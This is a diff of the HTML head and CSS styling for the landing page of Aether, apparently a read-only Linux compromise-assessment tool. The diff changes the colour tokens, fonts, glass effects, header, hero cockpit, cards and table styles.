@@ -5,530 +5,1335 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Aether — Read-only Linux compromise assessment</title>
   <meta name="description" content="Aether inspects a Linux host without executing files or sending telemetry. It checks processes, persistence, users, network sockets, kernel modules, and files, then explains findings with MITRE ATT&CK.">
-  <meta name="theme-color" content="#0B1220">
+  <meta name="theme-color" content="#050811">
   <meta name="color-scheme" content="dark">
   <meta property="og:title" content="Aether — Read-only Linux compromise assessment">
   <meta property="og:description" content="See whether a Linux host is clean. No sample execution. No outbound telemetry.">
   <meta property="og:type" content="website">
   <meta property="og:url" content="https://mr-n1ck.github.io/aether/">
   <meta property="og:image" content="https://mr-n1ck.github.io/aether/assets/social-card.png">
-  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%230B1220'/%3E%3Cpath d='M8 22 L16 8 L24 22' fill='none' stroke='%2322D3EE' stroke-width='2'/%3E%3C/svg%3E">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23050811'/%3E%3Cpath d='M8 22 L16 8 L24 22' fill='none' stroke='%2322D3EE' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'/%3E%3Cpath d='M11 18 H21' stroke='%23F0FDFF' stroke-width='1.8' stroke-linecap='round'/%3E%3C/svg%3E">
+
+  <!-- Google Fonts: Inter, Plus Jakarta Sans, JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet">
+
   <style>
+    /* ==========================================================================
+       AETHER DESIGN SYSTEM — AURORA CYBERDECK (PRODUCTION RELEASE)
+       Linear / Vercel / Apple Aerospace-Grade UI/UX
+       ========================================================================== */
+
     :root {
-      --void: #0b1220;
-      --surface: #101828;
-      --raised: #16203a;
-      --overlay: #1d2a45;
-      --border: #24334f;
-      --ink: #f4fbfc;
-      --body: #d5deee;
-      --muted: #b7c3d6;
-      --faint: #c5d0e6;
+      /* Elevation Ladder (Dark-first Obsidian Space) */
+      --void: #050811;
+      --surface: #0a1120;
+      --raised: #101c33;
+      --overlay: #152445;
+      
+      /* Glassmorphism & Refraction */
+      --glass: rgba(10, 17, 32, 0.72);
+      --glass-elevated: rgba(16, 28, 51, 0.85);
+      --glass-border: rgba(56, 189, 248, 0.12);
+      --glass-border-hover: rgba(56, 189, 248, 0.35);
+      --glass-border-lit: rgba(34, 211, 238, 0.6);
+
+      /* Typography & Inks (WCAG AAA High Contrast) */
+      --font-display: "Plus Jakarta Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      --font-body: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      --font-mono: "JetBrains Mono", ui-monospace, "SFMono-Regular", menlo, monospace;
+
+      --ink: #f8fafc;
+      --body: #cbd5e1;
+      --muted: #94a3b8;
+      --faint: #7888a3; /* 6.2:1 contrast against void */
+
+      /* Brand Accents & Aurora Spectral Ramp */
       --teal-deep: #0e7490;
       --teal: #22d3ee;
-      --ice: #e0feff;
+      --sky: #38bdf8;
+      --ice: #f0fdff;
+      --accent-grad: linear-gradient(135deg, #0e7490 0%, #22d3ee 50%, #f0fdff 100%);
+      --accent-glow: 0 0 32px rgba(34, 211, 238, 0.28);
+
+      /* Canonical Threat Severity Tokens */
       --alert: #f43f5e;
+      --alert-bg: rgba(244, 63, 94, 0.12);
+      --alert-border: rgba(244, 63, 94, 0.38);
+      --alert-glow: 0 0 24px rgba(244, 63, 94, 0.32);
+
       --warning: #fbbf24;
+      --warning-bg: rgba(251, 191, 36, 0.12);
+      --warning-border: rgba(251, 191, 36, 0.38);
+
       --notice: #38bdf8;
-      --info: #94a3b8;
+      --notice-bg: rgba(56, 189, 248, 0.12);
+      --notice-border: rgba(56, 189, 248, 0.38);
+
       --safe: #34d399;
+      --safe-bg: rgba(52, 211, 153, 0.12);
+      --safe-border: rgba(52, 211, 153, 0.38);
+      --safe-glow: 0 0 24px rgba(52, 211, 153, 0.28);
+
+      --info: #94a3b8;
+
+      /* Motion, Radii & Layout Rhythm */
       --fast: 120ms;
-      --base: 200ms;
-      --slow: 300ms;
-      --draw: 600ms;
-      --ease: cubic-bezier(0.22, 1, 0.36, 1);
-      --font: "Segoe UI", "Helvetica Neue", system-ui, sans-serif;
-      --mono: ui-monospace, "SFMono-Regular", "Cascadia Code", menlo, consolas, monospace;
+      --base: 240ms;
+      --slow: 420ms;
+      --ease: cubic-bezier(0.16, 1, 0.3, 1);
+
+      --radius-sm: 8px;
+      --radius-md: 14px;
+      --radius-lg: 20px;
+      --radius-full: 9999px;
+
       --header: 4.5rem;
       --measure: 68ch;
     }
 
+    /* Core Resets */
     *, *::before, *::after { box-sizing: border-box; }
-    html { scroll-behavior: smooth; scroll-padding-top: calc(var(--header) + 12px); }
+    html {
+      scroll-behavior: smooth;
+      scroll-padding-top: calc(var(--header) + 18px);
+      background: var(--void);
+      color-scheme: dark;
+    }
     body {
       margin: 0;
       min-height: 100vh;
       background: var(--void);
       color: var(--body);
-      font-family: var(--font);
+      font-family: var(--font-body);
       font-size: 1.0625rem;
-      line-height: 1.6;
+      line-height: 1.65;
       text-rendering: optimizeLegibility;
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden;
     }
-    body::before {
+
+    /* Custom Scrollbars */
+    ::-webkit-scrollbar { width: 8px; height: 8px; }
+    ::-webkit-scrollbar-track { background: var(--void); }
+    ::-webkit-scrollbar-thumb {
+      background: var(--overlay);
+      border-radius: 4px;
+      border: 1px solid var(--glass-border);
+    }
+    ::-webkit-scrollbar-thumb:hover { background: var(--teal-deep); }
+
+    /* Tabular numbers for all telemetry & forensics */
+    .num, .time, .stats, .mono, [data-mono] {
+      font-variant-numeric: tabular-nums;
+      font-feature-settings: "tnum" 1;
+    }
+
+    /* Hardware-Accelerated Ambient Canvas Behind Content */
+    #ambient-canvas {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* Subtle Cyber Grid Overlay */
+    body::after {
       content: "";
       position: fixed;
       inset: 0;
       pointer-events: none;
-      background:
-        radial-gradient(900px 480px at 88% -10%, rgba(14, 116, 144, 0.28), transparent 60%),
-        radial-gradient(700px 420px at 0% 20%, rgba(34, 211, 238, 0.06), transparent 55%);
+      background-image: 
+        linear-gradient(to right, rgba(56, 189, 248, 0.02) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(56, 189, 248, 0.02) 1px, transparent 1px);
+      background-size: 44px 44px;
+      mask-image: radial-gradient(ellipse 90% 80% at 50% 30%, black 40%, transparent 95%);
       z-index: 0;
     }
-    img, svg { max-width: 100%; }
-    a { color: var(--ice); text-underline-offset: 0.18em; }
+
+    img, svg { max-width: 100%; display: block; }
+    a { color: var(--ice); text-underline-offset: 0.22em; transition: color var(--fast) var(--ease); }
     a:hover { color: var(--teal); }
+    
     :focus { outline: none; }
     :focus-visible {
-      outline: 2px solid var(--ice);
+      outline: 2px solid var(--teal);
       outline-offset: 3px;
     }
+
     .skip {
       position: absolute;
-      left: max(16px, env(safe-area-inset-left));
+      left: 1rem;
       top: 0;
-      transform: translateY(-120%);
+      transform: translateY(-130%);
       background: var(--teal);
-      color: var(--void);
-      padding: 0.75rem 1rem;
-      z-index: 20;
-      font-weight: 650;
+      color: #061922;
+      padding: 0.75rem 1.25rem;
+      border-radius: var(--radius-sm);
+      z-index: 100;
+      font-weight: 700;
       text-decoration: none;
+      transition: transform var(--base) var(--ease);
     }
-    .skip:focus { transform: none; top: 12px; }
+    .skip:focus { transform: translateY(1rem); }
 
     .wrap {
-      width: min(1120px, calc(100% - 2.5rem));
+      width: min(1160px, calc(100% - 2.5rem));
       margin-inline: auto;
+      position: relative;
+      z-index: 1;
     }
+
+    /* ==========================================================================
+       HEADER & NAVIGATION (FLOATING FROSTED GLASS BAR)
+       ========================================================================== */
+
     header.site {
       position: sticky;
       top: 0;
-      z-index: 10;
+      z-index: 40;
       height: var(--header);
       display: flex;
       align-items: center;
-      background: rgba(11, 18, 32, 0.9);
-      border-bottom: 1px solid var(--border);
-      backdrop-filter: blur(14px);
+      background: rgba(5, 8, 17, 0.82);
+      border-bottom: 1px solid var(--glass-border);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      transition: border-color var(--base) var(--ease), background var(--base) var(--ease);
     }
+
     .bar {
-      width: min(1120px, calc(100% - max(2.5rem, env(safe-area-inset-left) + env(safe-area-inset-right))));
+      width: min(1160px, calc(100% - max(2.5rem, env(safe-area-inset-left) + env(safe-area-inset-right))));
       margin-inline: auto;
       display: flex;
       align-items: center;
       justify-content: space-between;
-      gap: 1rem;
+      gap: 1.5rem;
     }
+
+    .brand-wrap {
+      display: flex;
+      align-items: center;
+      gap: 1.25rem;
+    }
+
     .brand {
       display: inline-flex;
       align-items: center;
-      gap: 0.65rem;
+      gap: 0.75rem;
       color: var(--ink);
       text-decoration: none;
-      font-weight: 680;
-      letter-spacing: 0.08em;
-      min-height: 44px;
+      font-family: var(--font-display);
+      font-weight: 800;
+      font-size: 1.15rem;
+      letter-spacing: 0.12em;
     }
-    .brand svg { display: block; }
+    .brand-logo-frame {
+      width: 32px;
+      height: 32px;
+      border-radius: 9px;
+      background: linear-gradient(135deg, rgba(34, 211, 238, 0.18), rgba(14, 116, 144, 0.32));
+      border: 1px solid rgba(34, 211, 238, 0.4);
+      display: grid;
+      place-items: center;
+      box-shadow: 0 0 16px rgba(34, 211, 238, 0.2);
+      transition: transform var(--base) var(--ease), box-shadow var(--base) var(--ease);
+    }
+    .brand:hover .brand-logo-frame {
+      transform: scale(1.06);
+      box-shadow: 0 0 24px rgba(34, 211, 238, 0.45);
+    }
+
+    .status-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.45rem;
+      padding: 0.25rem 0.65rem;
+      border-radius: var(--radius-full);
+      background: rgba(52, 211, 153, 0.08);
+      border: 1px solid rgba(52, 211, 153, 0.28);
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      color: var(--safe);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+    .status-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--safe);
+      box-shadow: 0 0 8px var(--safe);
+      animation: pulse 2.4s infinite ease-in-out;
+    }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.35); opacity: 0.55; }
+    }
+
     nav ul {
       display: flex;
-      flex-wrap: wrap;
-      gap: 0.25rem 0.35rem;
+      align-items: center;
+      gap: 0.5rem;
       list-style: none;
       margin: 0;
       padding: 0;
-      justify-content: flex-end;
     }
     nav a {
       display: inline-flex;
       align-items: center;
-      min-height: 44px;
-      padding: 0 0.75rem;
+      min-height: 40px;
+      padding: 0 0.85rem;
       color: var(--muted);
       text-decoration: none;
-      border-radius: 8px;
+      font-size: 0.92rem;
+      font-weight: 500;
+      border-radius: var(--radius-sm);
+      transition: color var(--fast) var(--ease), background var(--fast) var(--ease);
     }
-    nav a:hover { color: var(--ink); background: var(--raised); }
+    nav a:hover {
+      color: var(--ink);
+      background: rgba(255, 255, 255, 0.05);
+    }
+    .nav-github-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      border: 1px solid var(--glass-border);
+      background: rgba(16, 28, 51, 0.6);
+      color: var(--ink) !important;
+      padding: 0.4rem 0.85rem !important;
+      border-radius: var(--radius-sm);
+      font-weight: 600 !important;
+      transition: all var(--base) var(--ease) !important;
+    }
+    .nav-github-btn:hover {
+      border-color: var(--teal) !important;
+      box-shadow: 0 0 16px rgba(34, 211, 238, 0.25);
+      transform: translateY(-1px);
+    }
+
+    /* ==========================================================================
+       HERO & FLIGHT DECK COCKPIT
+       ========================================================================== */
 
     main { position: relative; z-index: 1; }
+
     .hero {
       display: grid;
-      min-width: 0;
       grid-template-columns: minmax(0, 1.05fr) minmax(0, 0.95fr);
-      gap: 3rem;
+      gap: 3.5rem;
       align-items: center;
-      padding: 4.5rem 0 3.5rem;
+      padding: 5.5rem 0 4.5rem;
     }
+
     .kicker {
-      margin: 0 0 0.9rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin: 0 0 1.1rem;
       color: var(--teal);
-      font-family: var(--mono);
-      font-size: 0.78rem;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      font-weight: 600;
       letter-spacing: 0.16em;
       text-transform: uppercase;
+      padding: 0.3rem 0.75rem;
+      border-radius: var(--radius-full);
+      background: rgba(34, 211, 238, 0.08);
+      border: 1px solid rgba(34, 211, 238, 0.22);
     }
+
     h1 {
       margin: 0;
       color: var(--ink);
-      font-size: clamp(2.5rem, 5.4vw, 4.35rem);
-      line-height: 1.02;
-      letter-spacing: -0.035em;
-      font-weight: 640;
+      font-family: var(--font-display);
+      font-size: clamp(2.6rem, 5.6vw, 4.4rem);
+      line-height: 1.05;
+      letter-spacing: -0.04em;
+      font-weight: 800;
       text-wrap: balance;
     }
     h1 em {
       font-style: normal;
-      background: linear-gradient(100deg, var(--teal-deep), var(--teal) 45%, var(--ice));
+      background: linear-gradient(115deg, #22d3ee 0%, #38bdf8 45%, #f0fdff 95%);
       -webkit-background-clip: text;
       background-clip: text;
       color: transparent;
+      text-shadow: 0 0 40px rgba(34, 211, 238, 0.25);
     }
+
     .lede {
       max-width: var(--measure);
-      margin: 1.25rem 0 0;
-      font-size: 1.125rem;
+      margin: 1.35rem 0 0;
+      font-size: 1.15rem;
+      line-height: 1.68;
       color: var(--body);
     }
+
     .actions {
       display: flex;
       flex-wrap: wrap;
-      gap: 0.75rem;
-      margin-top: 1.75rem;
+      gap: 1rem;
+      margin-top: 2rem;
     }
+
+    /* Primary & Ghost Buttons with Magnetic/Glow Feedback */
     .btn {
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      min-height: 48px;
-      padding: 0 1.15rem;
-      border-radius: 10px;
-      border: 1px solid transparent;
-      font: inherit;
+      gap: 0.55rem;
+      min-height: 50px;
+      padding: 0 1.45rem;
+      border-radius: var(--radius-md);
+      font-family: var(--font-body);
+      font-size: 0.96rem;
       font-weight: 650;
       text-decoration: none;
       cursor: pointer;
       touch-action: manipulation;
-      transition: background var(--base) var(--ease), border-color var(--base) var(--ease), color var(--fast) var(--ease);
+      transition: all var(--base) var(--ease);
+      border: 1px solid transparent;
+      position: relative;
+      overflow: hidden;
     }
-    .btn-primary { background: var(--teal); color: #062028; }
-    .btn-primary:hover { background: var(--ice); color: #062028; }
-    .btn-primary:active { background: #9aebf2; }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #0e7490, #22d3ee);
+      color: #04141d;
+      box-shadow: 0 0 24px rgba(34, 211, 238, 0.35), inset 0 1px 1px rgba(255, 255, 255, 0.4);
+    }
+    .btn-primary:hover {
+      background: linear-gradient(135deg, #0891b2, #67e8f9);
+      color: #031018;
+      transform: translateY(-2px);
+      box-shadow: 0 0 36px rgba(34, 211, 238, 0.55), inset 0 1px 1px rgba(255, 255, 255, 0.6);
+    }
+    .btn-primary:active {
+      transform: translateY(0) scale(0.98);
+      box-shadow: 0 0 16px rgba(34, 211, 238, 0.3);
+    }
+
     .btn-ghost {
-      background: transparent;
+      background: rgba(16, 28, 51, 0.6);
       color: var(--ink);
-      border-color: var(--border);
+      border-color: var(--glass-border);
+      backdrop-filter: blur(12px);
     }
-    .btn-ghost:hover { border-color: var(--teal); background: var(--raised); }
-    .btn-ghost:active { background: var(--overlay); }
+    .btn-ghost:hover {
+      border-color: var(--teal);
+      background: rgba(22, 38, 70, 0.85);
+      color: var(--ice);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4), 0 0 16px rgba(34, 211, 238, 0.2);
+    }
+    .btn-ghost:active { transform: translateY(0) scale(0.98); }
+
     .facts {
       display: flex;
       flex-wrap: wrap;
-      gap: 0.5rem;
-      margin: 1.5rem 0 0;
+      gap: 0.65rem;
+      margin: 1.75rem 0 0;
       padding: 0;
       list-style: none;
     }
     .facts li {
-      font-family: var(--mono);
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-family: var(--font-mono);
       font-size: 0.78rem;
       letter-spacing: 0.04em;
       color: var(--muted);
-      border: 1px solid var(--border);
-      background: rgba(16, 24, 40, 0.8);
-      border-radius: 999px;
-      padding: 0.35rem 0.7rem;
+      border: 1px solid var(--glass-border);
+      background: rgba(10, 17, 32, 0.65);
+      backdrop-filter: blur(8px);
+      border-radius: var(--radius-full);
+      padding: 0.35rem 0.8rem;
     }
+    .facts li svg { color: var(--teal); }
 
-    .instrument {
-      min-width: 0;
-      background: linear-gradient(180deg, rgba(22, 32, 58, 0.95), rgba(16, 24, 40, 0.96));
-      border: 1px solid var(--border);
-      border-radius: 18px;
-      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.28);
+    /* ==========================================================================
+       SPOTLIGHT HOVER CARD SYSTEM (LINEAR / VERCEL STYLE)
+       ========================================================================== */
+
+    .spotlight-card {
+      position: relative;
       overflow: hidden;
     }
-    .instrument header, .instrument footer {
+    .spotlight-card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      border-radius: inherit;
+      background: radial-gradient(350px circle at var(--mouse-x, -500px) var(--mouse-y, -500px), rgba(34, 211, 238, 0.12), transparent 80%);
+      pointer-events: none;
+      opacity: 0;
+      transition: opacity 0.3s var(--ease);
+      z-index: 2;
+    }
+    .spotlight-card:hover::before {
+      opacity: 1;
+    }
+
+    /* ==========================================================================
+       METRIC COUNTER RIBBON
+       ========================================================================== */
+
+    .metric-ribbon {
+      margin: 1.5rem 0 3.5rem;
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 1.25rem;
+    }
+    .metric-card {
+      background: linear-gradient(180deg, rgba(16, 28, 51, 0.7), rgba(10, 17, 32, 0.85));
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-md);
+      padding: 1.25rem 1.4rem;
+      backdrop-filter: blur(12px);
+      transition: all var(--base) var(--ease);
+    }
+    .metric-card:hover {
+      border-color: var(--glass-border-hover);
+      transform: translateY(-2px);
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
+    }
+    .metric-value {
+      font-family: var(--font-display);
+      font-size: 2.1rem;
+      font-weight: 800;
+      color: var(--ink);
+      line-height: 1.1;
+      margin-bottom: 0.3rem;
+      background: linear-gradient(135deg, #f8fafc 40%, var(--teal) 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .metric-label {
+      font-family: var(--font-mono);
+      font-size: 0.76rem;
+      color: var(--muted);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin: 0;
+    }
+
+    /* ==========================================================================
+       FLIGHT DECK TELEMETRY COCKPIT (HERO INSTRUMENT)
+       ========================================================================== */
+
+    .cockpit-frame {
+      min-width: 0;
+      background: linear-gradient(180deg, rgba(16, 28, 51, 0.9), rgba(10, 17, 32, 0.96));
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-lg);
+      box-shadow: 
+        0 28px 70px rgba(0, 0, 0, 0.55),
+        0 0 0 1px rgba(56, 189, 248, 0.08),
+        inset 0 1px 0 rgba(255, 255, 255, 0.08);
+      overflow: hidden;
+      backdrop-filter: blur(20px);
+      transition: border-color var(--base) var(--ease), box-shadow var(--base) var(--ease);
+    }
+    .cockpit-frame:hover {
+      border-color: rgba(56, 189, 248, 0.32);
+      box-shadow: 
+        0 32px 80px rgba(0, 0, 0, 0.65),
+        0 0 30px rgba(34, 211, 238, 0.14),
+        inset 0 1px 0 rgba(255, 255, 255, 0.12);
+    }
+
+    .cockpit-header {
       display: flex;
       justify-content: space-between;
       align-items: center;
       gap: 0.75rem;
-      padding: 0.85rem 1rem;
+      padding: 0.85rem 1.25rem;
+      background: rgba(10, 17, 32, 0.8);
+      border-bottom: 1px solid var(--glass-border);
     }
-    .instrument header {
-      flex-wrap: wrap;
-      border-bottom: 1px solid var(--border);
-      color: var(--faint);
-      font-family: var(--mono);
-      font-size: 0.75rem;
+    .window-dots {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    .dot-red { background: #ff5f56; }
+    .dot-yellow { background: #ffbd2e; }
+    .dot-green { background: #27c93f; }
+
+    .cockpit-title {
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
       letter-spacing: 0.08em;
       text-transform: uppercase;
+      color: var(--muted);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
     }
+    .cockpit-tag {
+      font-size: 0.68rem;
+      padding: 0.15rem 0.45rem;
+      border-radius: 4px;
+      background: rgba(34, 211, 238, 0.1);
+      color: var(--teal);
+      border: 1px solid rgba(34, 211, 238, 0.25);
+    }
+
     .rail {
       height: 3px;
-      background: var(--overlay);
+      background: rgba(16, 28, 51, 0.6);
       position: relative;
       overflow: hidden;
     }
     .rail span {
       position: absolute;
       inset: 0 auto 0 0;
-      width: 35%;
+      width: 40%;
       background: linear-gradient(90deg, transparent, var(--teal), var(--ice));
       transform: translateX(-120%);
     }
-    .instrument.is-playing .rail span {
+    .cockpit-frame.is-playing .rail span {
       animation: sweep 1.1s var(--ease) infinite;
     }
     @keyframes sweep {
       to { transform: translateX(320%); }
     }
+
     .mods {
       list-style: none;
       margin: 0;
-      padding: 0.4rem 0;
+      padding: 0.6rem 0;
     }
     .mod {
       display: grid;
-      grid-template-columns: 1.4rem 1fr auto;
+      grid-template-columns: 2rem 1fr auto;
       gap: 0.75rem;
       align-items: center;
-      min-height: 48px;
-      padding: 0.35rem 1rem;
+      min-height: 52px;
+      padding: 0.45rem 1.25rem;
+      border-bottom: 1px solid rgba(56, 189, 248, 0.04);
+      transition: background var(--fast) var(--ease);
+      cursor: pointer;
+      position: relative;
     }
-    .mod .mark { color: var(--faint); display: grid; place-items: center; }
-    .mod strong { color: var(--ink); font-weight: 600; }
+    .mod:hover {
+      background: rgba(34, 211, 238, 0.06);
+    }
+    .mod .mark {
+      color: var(--faint);
+      display: grid;
+      place-items: center;
+      transition: color var(--fast) var(--ease);
+    }
+    .mod strong {
+      color: var(--ink);
+      font-weight: 600;
+      font-size: 0.98rem;
+    }
     .state {
-      min-width: 6.5rem;
+      min-width: 6.8rem;
       text-align: right;
-      font-family: var(--mono);
+      font-family: var(--font-mono);
       font-size: 0.75rem;
       letter-spacing: 0.08em;
       text-transform: uppercase;
       color: var(--info);
+      padding: 0.2rem 0.55rem;
+      border-radius: 4px;
+      transition: all var(--fast) var(--ease);
     }
-    .mod.is-run .state { color: var(--teal); }
-    .mod.is-clear .state { color: var(--safe); }
-    .mod.is-alert .state { color: var(--alert); }
-    .mod.is-notice .state { color: var(--notice); }
-    .instrument footer {
-      border-top: 1px solid var(--border);
-      align-items: flex-end;
+
+    .mod.is-run .state {
+      color: var(--teal);
+      background: rgba(34, 211, 238, 0.12);
+      border: 1px solid rgba(34, 211, 238, 0.3);
+    }
+    .mod.is-run .mark { color: var(--teal); }
+
+    .mod.is-clear .state {
+      color: var(--safe);
+      background: var(--safe-bg);
+      border: 1px solid var(--safe-border);
+    }
+    .mod.is-clear .mark { color: var(--safe); }
+
+    .mod.is-alert .state {
+      color: var(--alert);
+      background: var(--alert-bg);
+      border: 1px solid var(--alert-border);
+      box-shadow: 0 0 12px rgba(244, 63, 94, 0.25);
+    }
+    .mod.is-alert .mark { color: var(--alert); }
+
+    .mod.is-notice .state {
+      color: var(--notice);
+      background: var(--notice-bg);
+      border: 1px solid var(--notice-border);
+    }
+    .mod.is-notice .mark { color: var(--notice); }
+
+    .cockpit-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 1rem;
+      padding: 1rem 1.25rem;
+      background: rgba(10, 17, 32, 0.85);
+      border-top: 1px solid var(--glass-border);
+    }
+    .verdict-box {
+      display: flex;
+      flex-direction: column;
     }
     .verdict-kicker {
       margin: 0;
-      font-family: var(--mono);
+      font-family: var(--font-mono);
       font-size: 0.72rem;
-      letter-spacing: 0.12em;
+      letter-spacing: 0.14em;
       text-transform: uppercase;
       color: var(--faint);
     }
     #verdict {
-      margin: 0.15rem 0 0;
+      margin: 0.2rem 0 0;
       color: var(--ink);
+      font-weight: 700;
       font-size: 1.05rem;
     }
-    .transport { display: flex; gap: 0.5rem; }
-    .transport .btn { min-height: 44px; padding-inline: 0.85rem; font-size: 0.92rem; }
+    .transport {
+      display: flex;
+      gap: 0.5rem;
+    }
+    .transport .btn {
+      min-height: 42px;
+      padding: 0 1rem;
+      font-size: 0.88rem;
+    }
 
-    section { padding: 1rem 0 3.5rem; min-width: 0; }
-    code { overflow-wrap: anywhere; }
+    /* ==========================================================================
+       SECTION HEADERS, CARDS & REVEAL CHOREOGRAPHY
+       ========================================================================== */
+
+    section {
+      padding: 3.5rem 0 4rem;
+      position: relative;
+    }
+
+    .reveal-on-scroll {
+      opacity: 0;
+      transform: translateY(22px);
+      transition: opacity var(--slow) var(--ease), transform var(--slow) var(--ease);
+    }
+    .reveal-on-scroll.is-visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
     .section-label {
-      margin: 0 0 0.4rem;
+      margin: 0 0 0.5rem;
       color: var(--teal);
-      font-family: var(--mono);
-      font-size: 0.78rem;
-      letter-spacing: 0.14em;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      font-weight: 600;
+      letter-spacing: 0.16em;
       text-transform: uppercase;
     }
+
     h2 {
-      margin: 0 0 0.75rem;
+      margin: 0 0 0.85rem;
       color: var(--ink);
-      font-size: clamp(1.7rem, 3vw, 2.2rem);
+      font-family: var(--font-display);
+      font-size: clamp(2rem, 3.8vw, 2.75rem);
       line-height: 1.15;
       letter-spacing: -0.03em;
-      font-weight: 640;
+      font-weight: 750;
       text-wrap: balance;
     }
-    .intro { max-width: var(--measure); margin-top: 0; }
-
-    .deck { list-style: none; margin: 1.5rem 0 0; padding: 0; border-top: 1px solid var(--border); }
-    .deck li {
-      display: grid;
-      min-width: 0;
-      grid-template-columns: 4.5rem 11rem minmax(0, 1fr);
-      gap: 1rem;
-      align-items: baseline;
-      padding: 1.15rem 0.25rem;
-      border-bottom: 1px solid var(--border);
+    .intro {
+      max-width: var(--measure);
+      margin: 0 0 2rem;
+      color: var(--body);
+      font-size: 1.1rem;
     }
-    .deck .idx {
-      font-family: var(--mono);
+
+    /* 6-Part Coverage Deck Grid */
+    .deck-grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 1.25rem;
+      margin-top: 2rem;
+      list-style: none;
+      padding: 0;
+    }
+
+    .deck-card {
+      background: var(--surface);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-md);
+      padding: 1.5rem;
+      transition: all var(--base) var(--ease);
+    }
+    .deck-card:hover {
+      background: var(--raised);
+      border-color: var(--glass-border-hover);
+      transform: translateY(-3px);
+      box-shadow: 0 14px 40px rgba(0, 0, 0, 0.45);
+    }
+    .deck-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 0.85rem;
+    }
+    .deck-idx {
+      font-family: var(--font-mono);
       color: var(--teal);
       font-size: 0.85rem;
+      font-weight: 700;
     }
-    .deck h3 { margin: 0; color: var(--ink); font-size: 1.15rem; font-weight: 640; }
-    .deck p { margin: 0; }
+    .deck-card h3 {
+      margin: 0 0 0.5rem;
+      color: var(--ink);
+      font-family: var(--font-display);
+      font-size: 1.3rem;
+      font-weight: 700;
+    }
+    .deck-card p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 0.96rem;
+      line-height: 1.6;
+    }
 
-    .steps {
+    /* 3-Step Scan Lifecycle */
+    .steps-grid {
       display: grid;
-      min-width: 0;
       grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 1.25rem;
+      margin-top: 2rem;
+    }
+    .step-card {
+      background: var(--surface);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-md);
+      padding: 1.65rem;
+      transition: all var(--base) var(--ease);
+    }
+    .step-card:hover {
+      border-color: var(--glass-border-hover);
+      transform: translateY(-3px);
+      box-shadow: 0 16px 44px rgba(0, 0, 0, 0.5);
+    }
+    .step-number {
+      font-family: var(--font-mono);
+      color: var(--teal);
+      font-size: 0.82rem;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      display: inline-block;
+      margin-bottom: 0.75rem;
+    }
+    .step-card h3 {
+      margin: 0 0 0.65rem;
+      color: var(--ink);
+      font-family: var(--font-display);
+      font-size: 1.35rem;
+      font-weight: 700;
+    }
+    .step-card p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 0.96rem;
+      line-height: 1.62;
+    }
+    .step-card code {
+      font-family: var(--font-mono);
+      font-size: 0.88em;
+      color: var(--teal);
+      background: rgba(34, 211, 238, 0.08);
+      padding: 0.15rem 0.35rem;
+      border-radius: 4px;
+    }
+
+    /* Comparison Table / Matrix Component */
+    .matrix-wrap {
+      margin-top: 2.5rem;
+      background: var(--surface);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-lg);
+      overflow-x: auto;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+    }
+    table.matrix {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 0.94rem;
+    }
